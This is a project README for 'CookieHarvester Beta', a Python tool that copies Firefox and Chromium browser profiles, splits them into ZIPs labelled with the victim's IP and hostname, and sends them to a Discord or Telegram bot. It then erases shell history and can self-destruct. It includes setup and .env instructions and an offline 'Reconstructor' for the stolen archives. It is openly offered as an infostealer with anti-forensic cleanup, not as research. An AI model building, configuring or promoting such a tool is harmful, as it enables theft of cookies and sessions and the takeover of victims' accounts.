# Project

```
 ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗
██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝
██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗  
██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝  
╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗
 ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝

██╗  ██╗ █████╗ ██████╗ ██╗   ██╗███████╗███████╗████████╗███████╗██████╗ 
██║  ██║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
███████║███████║██████╔╝██║   ██║█████╗  ███████╗   ██║   █████╗  ██████╔╝
██╔══██║██╔══██║██╔══██╗╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║  ██║ ╚████╔╝ ███████╗███████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ beta
```

**CookieHarvester Beta** — Extracts browser profiles (Firefox/Chromium), compresses them into 8 MB ZIP
files, and sends them to Discord or Telegram. Cleans traces and self-destructs (optional).

![Status](https://img.shields.io/badge/status-beta-yellow)
![License](https://img.shields.io/badge/license-MIT-blue)
![Python](https://img.shields.io/badge/python-3.10+-blue)
![Stable](https://img.shields.io/badge/estable-SI-green)

---

## Table of Contents
- [Description](#description)
- [Structure](#structure)
- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Reconstructor](#reconstructor)
- [Author](#author)

---

## Description

CookieHarvester copies active browser profiles to `/tmp`, divides them into 8 MB ZIP files, and sends 
them to the configured transport (Discord or Telegram). If a send fails, it retries up to 3 times.
Upon completion, it deletes all traces and can self-destruct (`AUTODESTRUIR = True`).

This is the **Beta** branch with a modular architecture: the core is independent of the transport 
layer, and you can switch from Discord to Telegram with just one variable in the `.env`.

Requires **Python 3.10+** and the libraries `requests` and `python-dotenv`. If `requests` is not 
available, the script deletes itself.

Download the **Beta** branch for personal development.

---

## Structure
CookieHarvester has the following structure

```bash
CookieHarvester/
├── .env      #IMPORTANT   # Create your .env for credentials.   
├── config.py              # Global configuration and .env loading
├── main.py                # Orchestration of the flow
├── core/                  # Business logic (transport independent)
│ ├── init.py
│ ├── browsers.py          # Detection of open browsers
│ ├── profiles.py          # Search for Firefox/Chrome/Brave profiles
│ ├── copy.py              # Copy profile folders
│ ├── info.py              # Generation of info.txt
│ ├── compression.py       # ZIP + splitting into parts
│ └── cleaning.py          # Safe self-destruction
└── transport/             # Interchangeable delivery layer
├── init.py                # get_transport() selector
├── base.py                # Abstract Transport interface
├── discord.py             # Discord implementation
└── telegram.py            # Telegram implementation
```

> Previous monolithic versions are in `CH-utilidades/` as historical references, used for 
> testing bots or Windows environments. Remember language spanish write.

---

## Features

- **Analysis:** Detects the default browser and copies active profiles to `/tmp`.
- **Compression:** Splits profiles into 8 MB ZIP files named with IP, hostname,
 browser, date, and order.
- **Delivery:** Sends packages to the configured transport (Discord or Telegram). 
 Retries up to 3 times if a send fails.
- **Cleaning:** Deletes traces in bash and `/tmp`. Self-destructs if 
 `AUTODESTRUIR = True`.

---

## Requirements

- **Python 3.10+**
- **Libraries:** `requests`, `python-dotenv`
- **OS Compatible:** Linux (Mint, Fedora 44 KDE)

---

## Installation

Install only the **BETA** branch
```bash
git clone -b beta --single-branch https://github.com/CatsSociety/CookieHarvester.git
```
```bash
cd CookieHarvester/CookieHarvester
```
```bash
python3 -m venv venv && source venv/bin/activate
```
```bash
pip install requests python-dotenv
```

On Ubuntu 24.04 / Linux Mint 22, you may need `sudo apt install python3.12-venv` 
before creating the venv (PEP 668)

---

## Configuration

Create a `.env` file in the root of `CookieHarvester`

```bash
# Credentials

# Discord
API_Discord = "your_key_here"

# Telegram
TOKEN_TL = "bot token number"
CHAT_ID = "chat number"

# Transport selector (discord | telegram), uncomment one.
# TRANSPORT = "discord"
# TRANSPORT = "telegram"
```
Uncomment either of the two according to your bot.

---
## Usage

Once everything is ready, test the utility with:

```bash
cd CookieHarvesterBeta && python3 main.py
```
The script:
- Verifies requests.
- Reads the .env.
- Detects open browsers.
- Searches for Firefox profiles (and Chrome/Brave if SOPORTE_CHROME = True).
- Copies, compresses, and splits each profile.
- Sends parts via the configured transport.
- Sends a final summary.
- Cleans /tmp and self-destructs if AUTODESTRUIR = True.

---
## Reconstructor

The reconstructor is offline. It takes complete or partial ZIP files from 
`~/Downloads/CookiesZIP/`, joins them if necessary, extracts them to 
`~/Downloads/CookiesCompleted/`, and cleans only the processed package files.

With the following structure:

```bash
Reconstructor/
├── config.py
├── main.py
└── core/
    ├── names.py
    ├── verification.py
    ├── assembly.py
    ├── extraction.py
    └── cleaning.py
```
Once we have the zip files in the requested folder, you can use Reconstructor 
to build the final zip:

```bash
cd Reconstructor
```
```bash
python3 main.py
```

## Author
- Github: `@Bankai-HackingDev`

---